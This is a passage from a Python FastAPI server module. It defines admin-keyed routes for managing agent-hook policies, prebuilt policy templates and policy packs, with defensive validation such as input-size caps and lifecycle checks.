    be ~250KB at that level, which is the amplification factor for
    the regex_substitute ReDoS lane. We cap individual string values
    fed to the rewriter; oversize values are silently rejected
    (validation maps to 422) so a crafted blob can't burn CPU on
    `re.sub` even when the matcher does cover the tool_name.
    """
    model_config = {"extra": "forbid"}
    policy_id: str = Field(..., min_length=1, max_length=128,
                            pattern=_POLICY_ID_PATTERN)
    tool_name: str = Field(..., min_length=1, max_length=128)
    tool_input: dict

    @field_validator("tool_input")
    @classmethod
    def _cap_field_value_lengths(cls, v: dict) -> dict:
        # Match the `_MAX_REWRITE_INPUT_LEN` cap in rewriters.py. Any
        # single value larger than the cap is outside the rewriter's
        # safe operating envelope; refusing at the boundary closes the
        # amplification surface BEFORE we walk policy lookup or regex
        # engine. We only cap top-level string values; nested dicts
        # are rare in CC PreToolUse payloads and would otherwise let
        # an attacker hide a blow-up inside `tool_input["nested"]`.
        # `apply_rewriter` already gates against the same cap as
        # defense in depth.
        _MAX = 64 * 1024
        for k, val in v.items():
            if isinstance(val, str) and len(val) > _MAX:
                raise ValueError(
                    f"tool_input[{k!r}] exceeds {_MAX}-byte cap"
                )
            if isinstance(val, (dict, list)) and len(
                str(val)
            ) > _MAX * 2:
                raise ValueError(
                    f"tool_input[{k!r}] nested value too large"
                )
        return v


class RunCommandReq(BaseModel):
    """D63 — request body for the `magi-cp-run-command` shim's POST
    /policies/run_command call.

    The shim sends the policy id + the raw CC hook payload it
    received on stdin; the cloud resolves the RunCommandPolicy and
    returns the spec the shim should execute. `payload` is kept as a
    free-form dict — the shim may forward the CC payload as additional
    context for future conditional run_command logic, but the v1
    cloud-side resolver does not inspect it.
    """
    model_config = {"extra": "forbid"}
    policy_id: str = Field(..., min_length=1, max_length=128,
                            pattern=_POLICY_ID_PATTERN)
    payload: dict = Field(default_factory=dict)


_RESERVED_ID_SUFFIXES = ("/compiled", "/enabled")


def _run_command_allowed() -> bool:
    """D63 env knob: refuse RunCommandPolicy saves + /scripts uploads
    when `MAGI_CP_ALLOW_RUN_COMMAND=0`.

    Default-ON: any unset / blank / non-"0" value enables the surface.
    The self-host docker compose ships with the flag implicitly on; the
    hosted image overrides it to "0" so the multi-tenant fleet never
    spawns an inline subprocess off an authenticated REST request.
    """
    raw = os.environ.get("MAGI_CP_ALLOW_RUN_COMMAND")
    if raw is None:
        return True
    return raw.strip() != "0"


def _attach_policy_routes(app: FastAPI, store: PolicyStore,
                           policy_lock: asyncio.Lock,
                           *,
                           verifier_registry: "VerifierRegistry | None" = None,
                           keystore: "KeyStore | None" = None,
                           kid: str | None = None,
                           script_store: "ScriptStore | None" = None,
                           script_store_lock: asyncio.Lock | None = None,
                           pack_store: "PackStore | None" = None,
                           pack_store_lock: asyncio.Lock | None = None,
                           ) -> None:

    def _assert_policy_lifecycle_endorsed(policy: AnyPolicy) -> None:
        """D57e P1: lifecycle-endorsement gate.

        For every `EvidencePolicy` requires[] entry whose `kind ==
        'step'`, check that the verifier descriptor declares a
        `field_checks` group for the policy's `trigger.event`. On
        miss, raise HTTPException(422). Skips:

          - non-EvidencePolicy archetypes (no `requires` / `trigger`)
          - non-step requires (regex / llm_critic / shacl: no
            verifier descriptor to consult)
          - steps with no registered descriptor (custom verifier,
            `preview:` prefix, vendor preset whose descriptor mirror
            lags) — step_enforcement / preview prefix already cover
            those modes.

        The wizard's Step 3 picker already filters verifiers against
        the same predicate via `verifierFiresOnLifecycle()` in the
        web layer. PUT / POST /policies/compile are public API
        surfaces (admin-keyed, but still scriptable), so the same
        filter has to be enforced at the wire boundary or a curl
        body bypasses the picker filter and persists a vacuous
        gate.
        """
        from ..verifier.descriptors import (
            validate_policy_against_descriptors,
        )
        if not isinstance(policy, EvidencePolicy):
            return
        trig = getattr(policy, "trigger", None)
        event = getattr(trig, "event", None) if trig is not None else None
        if not isinstance(event, str) or not event:
            return
        step_refs: list[str] = []
        for req in policy.requires:
            if getattr(req, "kind", None) != "step":
                continue
            step = getattr(req, "step", None)
            if isinstance(step, str) and step:
                step_refs.append(step)
        issues = validate_policy_against_descriptors(
            policy_id=policy.id,
            trigger_event=event,
            step_refs=step_refs,
        )
        if not issues:
            return
        # First issue carries the most actionable detail; include the
        # allowed lifecycles so the dashboard / scripted caller can
        # remediate without a second round-trip.
        first = issues[0]
        raise HTTPException(
            422,
            (
                f"verifier {first['step']!r} does not fire on "
                f"{first['trigger_event']!r}; allowed: "
                f"{first['allowed_events']!r}"
            ),
        )

    def _resolve_enforcement_for(policy: AnyPolicy) -> str:
        """P8: resolve policy enforcement label deterministically.

        Issue #1 P0 (#14): non-Evidence archetypes are always
        enforcing (they compile to managed-settings primitives, no
        verifier hop). Only EvidencePolicy may resolve to
        `enforcing` vs `preview` based on its `requires[].step`
        bindings against the live registry.

        Falls back to the legacy (action, event)-derived label when
        either the registry isn't wired OR every requires entry is
        non-step (regex / llm_critic / shacl). The legacy label is the
        only sensible "preview vs enforcing" answer in those cases.
        """
        if not isinstance(policy, EvidencePolicy):
            return _enforcement_label(policy)
        from ..policy.step_enforcement import resolve_policy_enforcement
        has_step_req = any(r.kind == "step" for r in policy.requires)
        if not has_step_req:
            return _enforcement_label(policy)
        return resolve_policy_enforcement(
            policy,
            registry=verifier_registry,
            vendor_catalog_fn=vendor_catalog,
        )

    def _resolve_legacy_unstamped(ov: "PolicyOverride") -> tuple[str, bool]:
        """P8 follow-up (fix-cycle #1): re-validate a pre-P8 on-disk row
        on read.

        Pre-P8 rows have `enforcement=None`. Originally the REST layer
        fell back to the legacy (action, event)-derived
        `_enforcement_label` for these, which silently re-rendered a
        broken policy (step now decommissioned) as
        `"deterministic-gate"`. That re-creates the silent-fail-open
        mode P8 closes.

        New behaviour on `enforcement=None`:
          - no step reqs → legacy label (regex / llm_critic / shacl
            don't bind to a verifier).
          - all step reqs resolve cleanly → return resolved label
            (`"enforcing"` / `"preview"`).
          - any step req fails to resolve → return
            `"unresolved-legacy"` AND treat the row as effectively
            disabled at the compile path. The dashboard surfaces the
            gap; the runtime never ships a managed-settings hook for a
            verifier that has been decommissioned.

        The returned bool is `effective_enabled`: `False` ONLY when the
        row resolves to `"unresolved-legacy"`. PATCH /enabled stays the
        operator-visible toggle; this gate is a runtime-safety overlay
        that the operator cannot accidentally turn back on by toggling
        — only a successful re-PUT (with a valid step or `preview:`
        prefix) re-stamps a coherent label.
        """
        from ..policy.step_enforcement import (
            StepResolutionError, resolve_policy_enforcement,
        )
        if ov.enforcement is not None:
            return ov.enforcement, ov.enabled
        # Issue #1 P0 (#14): non-Evidence archetypes don't have a
        # `requires` field. They render as `enforcing`.
        if not isinstance(ov.policy, EvidencePolicy):
            return _enforcement_label(ov.policy), ov.enabled
        has_step_req = any(r.kind == "step" for r in ov.policy.requires)
        if not has_step_req:
            return _enforcement_label(ov.policy), ov.enabled
        try:
            label = resolve_policy_enforcement(
                ov.policy,
                registry=verifier_registry,
                vendor_catalog_fn=vendor_catalog,
            )
        except StepResolutionError:
            return "unresolved-legacy", False
        return label, ov.enabled

    @app.get("/policies", dependencies=[Depends(require_admin_key)])
    def list_policies() -> dict:
        items = []
        for ov in store.load():
            # Issue #1 P0 (#13, #14): non-Evidence archetypes have no
            # `trigger`. We render `trigger` only when present so the
            # list response doesn't fabricate a fake event for declarative
            # rows.
            # P8 follow-up: legacy unstamped rows are re-validated
            # against the live registry. If a referenced step has been
            # decommissioned the row renders as `"unresolved-legacy"`
            # so the operator sees the gap — instead of the pre-P8
            # silent fall-back to `"deterministic-gate"`.
            enf, _eff_enabled = _resolve_legacy_unstamped(ov)
            trig = getattr(ov.policy, "trigger", None)
            entry = {
                "id": ov.policy.id,
                "description": ov.policy.description,
                "source": ov.source,
                "enabled": ov.enabled,
                "enforcement": enf,
                "type": getattr(ov.policy, "type", "evidence"),
            }
            if trig is not None:
                entry["trigger"] = {"event": trig.event,
                                     "matcher": trig.matcher}
            elif isinstance(ov.policy, ContextInjectionPolicy):
                # D74a follow-up: ContextInjectionPolicy carries the
                # hook surface in `event` + `matcher` directly (no
                # `trigger` triple). Synthesize a uniform `{event,
                # matcher}` shape so the dashboard list renders a
                # surface for context_injection rows (the previous
                # code suppressed the trigger span entirely, hiding
                # the only operator-visible cue of what fires the
                # rule). SubagentPolicy + McpGatingPolicy stay
                # without `trigger` — they truly have no event scope.
                entry["trigger"] = {
                    "event": ov.policy.event,
                    "matcher": ov.policy.matcher,
                }
            items.append(entry)
        return {"items": items}

    # D54: prebuilt policy templates. The 5 built-in verifiers each
    # ship with an implicit sensible-default policy (which event,
    # matcher, action they typically pair with). Pre-D54 that
    # information was crammed onto the Verifiers tab as policy-decision
    # language on each verifier card; D54 moves it here so the
    # verifier=function vs policy=composition distinction stays clean
    # in the dashboard. D60 reframes the section as a toggle list:
    # GET returns `enabled` so the dashboard can render the toggle
    # state, POST /enable materializes the prebuilt's IR as a saved
    # policy with the prebuilt id, DELETE disables it. Editing through
    # the wizard stays available as a secondary path.
    #
    # Routed BEFORE the `/policies/{policy_id:path}` catch-all so the
    # literal `prebuilt` path doesn't get swallowed as a policy id.
    @app.get("/policies/prebuilt", dependencies=[Depends(require_admin_key)])
    def list_prebuilt_policies() -> dict:
        from ..policy.prebuilt import all_prebuilt_policies
        # Only mark `enabled` when the on-disk row is both present AND
        # carries the `enabled` flag set to true. A row that was
        # disabled (toggle off via PATCH /enabled) but still present
        # in the store should render as off, not on, so the toggle is
        # the operator's source of truth.
        enabled_ids = {
            ov.policy.id for ov in store.load() if ov.enabled
        }
        return {"items": all_prebuilt_policies(enabled_ids=enabled_ids)}

    # D60: enable a prebuilt template as a saved policy. Idempotent —
    # enabling an already-enabled prebuilt is a no-op (returns the
    # current saved row). When a row with the prebuilt's id exists
    # but is disabled, this re-enables it without rewriting the
    # policy body so any operator-side edits to the IR (description
    # tweak, allowlist value) survive the toggle.
    #
    # URL design: the prebuilt slug carries a `prebuilt/` prefix in
    # the catalog (e.g. `prebuilt/citation-verify-at-final`). The
    # route path already contains the static `prebuilt/` segment, so
    # the `{slug}` URL parameter only carries the suffix
    # (`citation-verify-at-final`). The handler re-attaches the
    # prefix when looking up the spec. This keeps the URL short and
    # readable and avoids the FastAPI `:path` greedy-match
    # ambiguity that lets `/policies/prebuilt/...` collide with
    # `/policies/prebuilt/{slug}/enable`.
    def _revalidate_for_reenable(ov: PolicyOverride) -> str:
        """D60 follow-up: re-arm gate shared with PATCH /enabled.

        When a stored row is being flipped OFF -> ON we re-resolve the
        policy against the live verifier registry + descriptor surface,
        so a row stamped months ago against a now-decommissioned step
        (or a now-disallowed (trigger.event, step) pairing) raises 409
        instead of silently shipping a stale enforcement label. This
        mirrors the PATCH /policies/{id}/enabled handler. The new
        POST /policies/prebuilt/{slug}/enable surface previously
        skipped this check on the re-enable branch, opening a
        two-surface divergence: the same row would 409 via PATCH but
        succeed via POST.

        Returns the resolved enforcement label for the saved row.

        Raises HTTPException(409) on a registry / lifecycle drift.
        """
        from ..policy.step_enforcement import (
            StepResolutionError, resolve_policy_enforcement,
        )
        from ..verifier.descriptors import (
            validate_policy_against_descriptors,
        )
        if not (
            isinstance(ov.policy, EvidencePolicy)
            and any(r.kind == "step" for r in ov.policy.requires)
        ):
            return ov.enforcement or _resolve_enforcement_for(ov.policy)
        try:
            new_enforcement = resolve_policy_enforcement(
                ov.policy,
                registry=verifier_registry,
                vendor_catalog_fn=vendor_catalog,
            )
        except StepResolutionError as e:
            raise HTTPException(
                409,
                f"cannot re-enable: backing verifier "
                f"{e.step!r} no longer registered, "
                f"re-author with current /verifiers "
                f"or 'preview:' prefix",
            ) from e
        # Lifecycle endorsement drift on the stored body.
        _trig = getattr(ov.policy, "trigger", None)
        _event = (
            getattr(_trig, "event", None)
            if _trig is not None else None
        )
        _step_refs = [
            r.step for r in ov.policy.requires
            if r.kind == "step"
            and isinstance(getattr(r, "step", None), str)
        ]
        _drift_issues = (
            validate_policy_against_descriptors(
                policy_id=ov.policy.id,
                trigger_event=_event or "",
                step_refs=_step_refs,
            )
            if isinstance(_event, str) and _event
            else []
        )
        if _drift_issues:
            _first = _drift_issues[0]
            raise HTTPException(
                409,
                (
                    f"cannot re-enable: verifier "
                    f"{_first['step']!r} no longer "
                    f"fires on "
                    f"{_first['trigger_event']!r}; "
                    f"allowed lifecycles: "
                    f"{_first['allowed_events']!r}, "
                    f"re-author this policy under one "
                    f"of those lifecycles"
                ),
            )
        return new_enforcement

    def _enable_prebuilt_locked(slug: str) -> dict:
        """Lock-held body of enable_prebuilt_policy. Extracted so the
        pack cascade (which holds policy_lock for the entire loop to
        keep `only_missing` and post-cascade status snapshots
        consistent under concurrent admin requests) can re-use the
        materialization path without nesting the same non-reentrant
        asyncio.Lock.
        """
        from ..policy.prebuilt import (
            build_prebuilt_evidence_policy,
            prebuilt_spec_by_id,
        )
        prebuilt_id = f"prebuilt/{slug}"
        spec = prebuilt_spec_by_id(prebuilt_id)
        if spec is None:
            raise HTTPException(404, f"prebuilt {prebuilt_id!r} not found")
        existing = store.load()
        target: PolicyOverride | None = None
        for ov in existing:
            if ov.policy.id == prebuilt_id:
                target = ov
                break
        if target is not None and target.enabled:
            saved_enforcement = (
                target.enforcement
                or _resolve_enforcement_for(target.policy)
            )
            return {
                "id": target.policy.id,
                "enabled": True,
                "source": target.source,
                "enforcement": saved_enforcement,
                "setup_required": spec.setup_required,
            }
        if target is None:
            policy = build_prebuilt_evidence_policy(prebuilt_id)
            assert policy is not None
            _assert_policy_lifecycle_endorsed(policy)
            saved_enforcement = _resolve_enforcement_for(policy)
            saved_source = "bot"
            existing.append(PolicyOverride(
                policy=policy,
                source=saved_source,
                enabled=True,
                enforcement=saved_enforcement,
            ))
        else:
            saved_enforcement = _revalidate_for_reenable(target)
            _assert_policy_lifecycle_endorsed(target.policy)
            saved_source = target.source
            existing = [ov for ov in existing if ov.policy.id != prebuilt_id]
            existing.append(PolicyOverride(
                policy=target.policy,
                source=saved_source,
                enabled=True,
                enforcement=saved_enforcement,
            ))
        store.save(existing)
        return {
            "id": prebuilt_id,
            "enabled": True,
            "source": saved_source,
            "enforcement": saved_enforcement,
            "setup_required": spec.setup_required,
        }

    def _disable_prebuilt_locked(slug: str) -> dict:
        """Lock-held body of disable_prebuilt_policy. See
        _enable_prebuilt_locked for why this is split."""
        from ..policy.prebuilt import (
            build_prebuilt_evidence_policy,
            prebuilt_spec_by_id,
        )
        prebuilt_id = f"prebuilt/{slug}"
        spec = prebuilt_spec_by_id(prebuilt_id)
        if spec is None:
            raise HTTPException(404, f"prebuilt {prebuilt_id!r} not found")
        existing = store.load()
        new_list: list[PolicyOverride] = []
        changed = False
        target_after: PolicyOverride | None = None
        for ov in existing:
            if ov.policy.id == prebuilt_id and ov.enabled:
                new_ov = PolicyOverride(
                    policy=ov.policy,
                    source=ov.source,
                    enabled=False,
                    enforcement=ov.enforcement,
                )
                new_list.append(new_ov)
                target_after = new_ov
                changed = True
            else:
                new_list.append(ov)
                if ov.policy.id == prebuilt_id:
                    target_after = ov
        if changed:
            store.save(new_list)
        if target_after is not None:
            source = target_after.source
            enforcement = (
                target_after.enforcement
                or _resolve_enforcement_for(target_after.policy)
            )
        else:
            fresh_policy = build_prebuilt_evidence_policy(prebuilt_id)
            assert fresh_policy is not None
            source = "bot"
            enforcement = _resolve_enforcement_for(fresh_policy)
        return {
            "id": prebuilt_id,
            "enabled": False,
            "source": source,
            "enforcement": enforcement,
            "setup_required": spec.setup_required,
        }

    @app.post(
        "/policies/prebuilt/{slug}/enable",
        dependencies=[Depends(require_admin_key)],
    )
    async def enable_prebuilt_policy(slug: str) -> dict:
        from ..policy.prebuilt import (
            build_prebuilt_evidence_policy,
            prebuilt_spec_by_id,
        )
        prebuilt_id = f"prebuilt/{slug}"
        spec = prebuilt_spec_by_id(prebuilt_id)
        if spec is None:
            raise HTTPException(404, f"prebuilt {prebuilt_id!r} not found")
        async with policy_lock:
            existing = store.load()
            target: PolicyOverride | None = None
            for ov in existing:
                if ov.policy.id == prebuilt_id:
                    target = ov
                    break
            if target is not None and target.enabled:
                # No-op idempotent path. D60 follow-up: return the
                # SAVED enforcement label (already on the row), not a
                # recomputed value, so the response shape matches
                # what `target.enforcement or _resolve_enforcement_for`
                # would yield on a fresh read.
                saved_enforcement = (
                    target.enforcement
                    or _resolve_enforcement_for(target.policy)
                )
                return {
                    "id": target.policy.id,
                    "enabled": True,
                    "source": target.source,
                    "enforcement": saved_enforcement,
                    "setup_required": spec.setup_required,
                }
            if target is None:
                # First-time enable: materialize the spec.
                policy = build_prebuilt_evidence_policy(prebuilt_id)
                assert policy is not None  # spec is not None, so this builds.
                # Lifecycle endorsement: prebuilts pass the same gate
                # as any other PUT /policies body so a future
                # descriptor change can't ship a vacuous gate via the
                # toggle path.
                _assert_policy_lifecycle_endorsed(policy)
                saved_enforcement = _resolve_enforcement_for(policy)
                saved_source = "bot"
                existing.append(PolicyOverride(
                    policy=policy,
                    source=saved_source,
                    enabled=True,
                    enforcement=saved_enforcement,
                ))
            else:
                # Row exists but disabled — re-enable in place so the
                # operator's IR edits (if any) survive the toggle. The
                # body itself is preserved by NOT re-materializing
                # from the spec.
                # D60 follow-up: re-run the same registry +
                # lifecycle gates the PATCH /enabled surface uses
                # for re-arm. Without this, an IR the operator
                # edited through the wizard (e.g. swapped an
                # EvidenceReq.kind to a now-deprecated step) could
                # round-trip ON via the toggle while PATCH rejected
                # it — splitting truth across two enable surfaces.
                saved_enforcement = _revalidate_for_reenable(target)
                _assert_policy_lifecycle_endorsed(target.policy)
                saved_source = target.source
                existing = [ov for ov in existing if ov.policy.id != prebuilt_id]
                existing.append(PolicyOverride(
                    policy=target.policy,
                    source=saved_source,
                    enabled=True,
                    enforcement=saved_enforcement,
                ))
            store.save(existing)
        return {
            "id": prebuilt_id,
            "enabled": True,
            # D60 follow-up: bind to the value we actually saved
            # rather than a freshly-computed local that may not match
            # `target.enforcement or enforcement` on the re-enable
            # branch.
            "source": saved_source,
            "enforcement": saved_enforcement,
            "setup_required": spec.setup_required,
        }

    # D60: disable a prebuilt template. Idempotent — disabling an
    # already-disabled (or absent) prebuilt is a no-op. We KEEP the
    # row in the store on disable rather than deleting it so the
    # operator's IR edits survive a disable + re-enable round-trip.
    # This matches the PATCH /enabled pattern (toggle is
    # metadata-only). Slug shape matches the enable route — see the
    # comment above for the URL design rationale.
    @app.delete(
        "/policies/prebuilt/{slug}",
        dependencies=[Depends(require_admin_key)],
    )
    async def disable_prebuilt_policy(slug: str) -> dict:
        from ..policy.prebuilt import (
            build_prebuilt_evidence_policy,
            prebuilt_spec_by_id,
        )
        prebuilt_id = f"prebuilt/{slug}"
        spec = prebuilt_spec_by_id(prebuilt_id)
        if spec is None:
            raise HTTPException(404, f"prebuilt {prebuilt_id!r} not found")
        async with policy_lock:
            existing = store.load()
            new_list: list[PolicyOverride] = []
            changed = False
            target_after: PolicyOverride | None = None
            for ov in existing:
                if ov.policy.id == prebuilt_id and ov.enabled:
                    new_ov = PolicyOverride(
                        policy=ov.policy,
                        source=ov.source,
                        enabled=False,
                        enforcement=ov.enforcement,
                    )
                    new_list.append(new_ov)
                    target_after = new_ov
                    changed = True
                else:
                    new_list.append(ov)
                    if ov.policy.id == prebuilt_id:
                        target_after = ov
            if changed:
                store.save(new_list)
        # D60 follow-up: mirror the enable response envelope so a
        # non-dashboard client can reconcile local state from the
        # response body without a refetch. When no row is persisted
        # (operator never enabled this prebuilt) we fall back to the
        # spec's defaults so the shape stays the same.
        if target_after is not None:
            source = target_after.source
            enforcement = (
                target_after.enforcement
                or _resolve_enforcement_for(target_after.policy)
            )
        else:
            from ..policy.prebuilt import build_prebuilt_evidence_policy
            fresh_policy = build_prebuilt_evidence_policy(prebuilt_id)
            assert fresh_policy is not None  # spec is not None.
            source = "bot"
            enforcement = _resolve_enforcement_for(fresh_policy)
        return {
            "id": prebuilt_id,
            "enabled": False,
            "source": source,
            "enforcement": enforcement,
            "setup_required": spec.setup_required,
        }

    # ── D75: policy packs ───────────────────────────────────────────
    #
    # A pack is a named GROUP of policy ids that share an operator
    # context. Built-in packs (`pack/...`) ship membership in
    # `policy/pack.py`; user packs (`user-pack/...`) persist in the
    # `pack_store`. Enable/disable cascades to every member; for
    # `prebuilt/...` members we route through the same enable/disable
    # path the prebuilt toggle uses, so the materialized IR + lifecycle
    # gate match exactly. For inline IRs the strict-block bundle owns,
    # we persist via the same PolicyOverride shape the prebuilt branch
    # uses.
    #
    # Decision (per the brief): "blunt cascade". A pack toggle sets each
    # member's enabled state to the target regardless of other-pack
    # ownership. Simpler tests, fewer surprises; the alternative ("only
    # disable when no other enabled pack still owns this member")
    # requires a global pack-membership reverse-index that's easy to
    # drift on user-pack edits.
    #
    # Routed BEFORE the `/policies/{policy_id:path}` catch-all is added
    # in this same function (the catch-all installs further down). The
    # literal `/policy-packs` prefix avoids the collision.

    def _pack_locale(accept_language: str | None) -> str:
        """Return 'ko' when the request Accept-Language prefers Korean,
        else 'en'.

        Fix follow-up: walk the full quality-ordered list instead of
        taking only the first segment. `en-US,ko;q=0.9` previously
        returned 'en' even when the operator's primary UI is Korean and
        the dashboard had set the cookie to ko; the server component
        forwards the cookie locale on dashboard fetches so the bug only
        bit operators driving the admin HTTP surface from curl /
        scripted tooling. Now we score each comma-separated tag by its
        `q=` value (default 1.0) and pick the first tag whose primary
        subtag matches ko or en. Anything else (or no header at all)
        falls back to 'en'.
        """
        if not accept_language:
            return "en"
        ranked: list[tuple[float, int, str]] = []
        for idx, raw_tag in enumerate(accept_language.split(",")):
            tag = raw_tag.strip()
            if not tag:
                continue
            quality = 1.0
            parts = [p.strip() for p in tag.split(";")]
            head = parts[0].lower()
            for param in parts[1:]:
                if param.startswith("q="):
                    try:
                        quality = float(param[2:])
                    except ValueError:
                        quality = 0.0
                    break
            if quality <= 0:
                continue
            # Negate idx so a tie on quality preserves header order via
            # max() (lower idx wins among equal-quality tags).
            ranked.append((quality, -idx, head))
        # Stable sort by descending quality + ascending header position.
        ranked.sort(key=lambda r: (-r[0], -r[1]))
        for _q, _idx, head in ranked:
            if head.startswith("ko"):
                return "ko"
            if head.startswith("en"):
                return "en"
        return "en"

    def _enabled_id_set() -> set[str]:
        return {ov.policy.id for ov in store.load() if ov.enabled}

    def _all_policy_id_set() -> set[str]:
        """Every policy id currently saved in the store (enabled OR not).

        Used by `user_pack_to_dict` to flag a member id as stale when
        it is neither a known prebuilt nor present in the store. A
        stale id reports `ok: false` on cascade enable and would pin
        the pack at status=partial forever; the dashboard renders a
        chip so the operator can see why."""
        return {ov.policy.id for ov in store.load()}

    def _list_user_packs_dict(locale: str) -> list[dict]:
        from ..policy.pack import user_pack_to_dict
        if pack_store is None:
            return []
        enabled = _enabled_id_set()
        store_ids = _all_policy_id_set()
        out: list[dict] = []
        for row in pack_store.load():
            pack = user_pack_to_dict(
                row.id, row.name, row.description,
                row.policy_ids, enabled,
                store_policy_ids=store_ids,
            )
            entry = dict(pack)
            # P4: surface the floor bit so the dashboard can render the
            # floor pack first with an "ALWAYS-ON" badge and no
            # activation controls.
            entry["is_floor"] = bool(getattr(row, "is_floor", False))
            out.append(entry)
            del locale  # locale doesn't affect user-pack copy
        return out

    def _list_builtin_packs_dict(locale: str) -> list[dict]:
        from ..policy.pack import all_builtin_packs
        enabled = _enabled_id_set()
        return [dict(p) for p in all_builtin_packs(locale=locale,
                                                    enabled_ids=enabled)]

    @app.get("/policy-packs", dependencies=[Depends(require_admin_key)])
    def list_policy_packs(
        accept_language: str | None = Header(default=None,
                                              alias="Accept-Language"),
    ) -> dict:
        locale = _pack_locale(accept_language)
        return {
            "items": [
                *_list_builtin_packs_dict(locale),
                *_list_user_packs_dict(locale),
            ],
        }

    def _resolve_pack_members(pack_id: str) -> list[str] | None:
        """Return the ordered member ids of the given pack, or None
        when the pack is unknown. Used by GET-single + enable + disable
        handlers.
        """
        from ..policy.pack import builtin_pack_spec_by_id, _builtin_member_ids
        spec = builtin_pack_spec_by_id(pack_id)
        if spec is not None:
            return _builtin_member_ids(spec)
        if pack_id.startswith("user-pack/") and pack_store is not None:
            for row in pack_store.load():
                if row.id == pack_id:
                    return list(row.policy_ids)
        return None

    @app.get("/policy-packs/{pack_id:path}",
             dependencies=[Depends(require_admin_key)])
    def get_policy_pack(
        pack_id: str,
        accept_language: str | None = Header(default=None,
                                              alias="Accept-Language"),
    ) -> dict:
        from ..policy.pack import (
            all_builtin_packs, builtin_pack_spec_by_id, user_pack_to_dict,
        )
        if not pack_id.startswith("pack/") and not pack_id.startswith("user-pack/"):
            raise HTTPException(404, f"pack {pack_id!r} not found")
        locale = _pack_locale(accept_language)
        enabled = _enabled_id_set()
        # Built-in.
        spec = builtin_pack_spec_by_id(pack_id)
        if spec is not None:
            built = next(
                p for p in all_builtin_packs(locale=locale, enabled_ids=enabled)
                if p["id"] == pack_id
            )
            members_resolved = [
                {"id": mid, "enabled": (mid in enabled)}
                for mid in built["policy_ids"]
            ]
            envelope = dict(built)
            envelope["members"] = members_resolved
            return envelope
        # User.
        if pack_store is not None:
            store_ids = _all_policy_id_set()
            for row in pack_store.load():
                if row.id == pack_id:
                    p = user_pack_to_dict(
                        row.id, row.name, row.description,
                        row.policy_ids, enabled,
                        store_policy_ids=store_ids,
                    )
                    envelope = dict(p)
                    envelope["members"] = [
                        {"id": mid, "enabled": (mid in enabled)}
                        for mid in row.policy_ids
                    ]
                    return envelope
        raise HTTPException(404, f"pack {pack_id!r} not found")

    @app.post("/policy-packs",
              dependencies=[Depends(require_admin_key)])
    async def create_user_pack(req: dict = Body(...)) -> dict:
        if pack_store is None or pack_store_lock is None:
            raise HTTPException(500, "pack store not configured")
        if not isinstance(req, dict):
            raise HTTPException(422, "body must be a JSON object")
        raw_name = req.get("name")
        if not isinstance(raw_name, str):
            raise HTTPException(422, "name is required")
        name = raw_name.strip()
        if not name:
            raise HTTPException(422, "name is required")
        if len(name) > 200:
            raise HTTPException(422, "name too long (max 200)")
        raw_desc = req.get("description") or ""
        if not isinstance(raw_desc, str):
            raise HTTPException(422, "description must be a string")
        description = raw_desc.strip()
        if len(description) > 1000:
            raise HTTPException(422, "description too long (max 1000)")
        raw_policy_ids = req.get("policy_ids")
        if raw_policy_ids is None:
            raw_policy_ids = []
        if not isinstance(raw_policy_ids, list):
            raise HTTPException(422, "policy_ids must be a list")
        # De-dupe policy_ids while preserving order. Empty list is
        # allowed (operator may build the pack incrementally).
        seen: set[str] = set()
        member_ids: list[str] = []
        for mid in raw_policy_ids:
            if not isinstance(mid, str) or not mid:
                raise HTTPException(422, "policy_ids entries must be strings")
            if mid in seen:
                continue
            seen.add(mid)
            member_ids.append(mid)
        raw_slug = req.get("slug")
        if raw_slug is not None and not isinstance(raw_slug, str):
            raise HTTPException(422, "slug must be a string")
        slug_raw = raw_slug or slugify_name(name)
        try:
            slug = validate_user_slug(slug_raw)
        except ValueError as e:
            raise HTTPException(422, str(e))
        pack_id = f"user-pack/{slug}"
        async with pack_store_lock:
            rows = pack_store.load()
            if any(r.id == pack_id for r in rows):
                raise HTTPException(409, f"pack {pack_id!r} already exists")
            rows.append(UserPackRow(
                id=pack_id, name=name, description=description,
                policy_ids=member_ids,
            ))
            pack_store.save(rows)
        return {
            "id": pack_id,
            "name": name,
            "description": description,
            "policy_ids": member_ids,
            "source": "user",
        }

    @app.put("/policy-packs/{pack_id:path}",
             dependencies=[Depends(require_admin_key)])
    async def update_user_pack(
        pack_id: str, req: dict = Body(...),
    ) -> dict:
        if pack_id.startswith("pack/"):
            raise HTTPException(405, "built-in packs are immutable")
        if not pack_id.startswith("user-pack/"):
            raise HTTPException(404, f"pack {pack_id!r} not found")
        if pack_store is None or pack_store_lock is None:
            raise HTTPException(500, "pack store not configured")
        if not isinstance(req, dict):
            raise HTTPException(422, "body must be a JSON object")
        in_name = req.get("name")
        in_desc = req.get("description")
        in_policy_ids = req.get("policy_ids")
        async with pack_store_lock:
            rows = pack_store.load()
            target_idx: int | None = None
            for i, r in enumerate(rows):
                if r.id == pack_id:
                    target_idx = i
                    break
            if target_idx is None:
                raise HTTPException(404, f"pack {pack_id!r} not found")
            cur = rows[target_idx]
            if in_name is None:
                new_name = cur.name
            else:
                if not isinstance(in_name, str):
                    raise HTTPException(422, "name must be a string")
                new_name = in_name.strip()
                if not new_name:
                    raise HTTPException(422, "name must not be empty")
            if len(new_name) > 200:
                raise HTTPException(422, "name too long (max 200)")
            if in_desc is None:
                new_desc = cur.description
            else:
                if not isinstance(in_desc, str):
                    raise HTTPException(422, "description must be a string")
                new_desc = in_desc.strip()
            if len(new_desc) > 1000:
                raise HTTPException(422, "description too long (max 1000)")
            if in_policy_ids is None:
                new_members = list(cur.policy_ids)
            else:
                if not isinstance(in_policy_ids, list):
                    raise HTTPException(422, "policy_ids must be a list")
                seen: set[str] = set()
                new_members = []
                for mid in in_policy_ids:
                    if not isinstance(mid, str) or not mid:
                        raise HTTPException(
                            422, "policy_ids entries must be strings",
                        )
                    if mid in seen:
                        continue
                    seen.add(mid)
                    new_members.append(mid)
            rows[target_idx] = UserPackRow(
                id=pack_id, name=new_name, description=new_desc,
                policy_ids=new_members,
            )
            pack_store.save(rows)
        return {
            "id": pack_id,
            "name": new_name,
            "description": new_desc,
            "policy_ids": new_members,
            "source": "user",
        }

    @app.delete("/policy-packs/{pack_id:path}",
                dependencies=[Depends(require_admin_key)])
    async def delete_user_pack(pack_id: str) -> dict:
        if pack_id.startswith("pack/"):
            raise HTTPException(405, "built-in packs are immutable")
        if not pack_id.startswith("user-pack/"):
            raise HTTPException(404, f"pack {pack_id!r} not found")
        if pack_store is None or pack_store_lock is None:
            raise HTTPException(500, "pack store not configured")
        async with pack_store_lock:
            rows = pack_store.load()
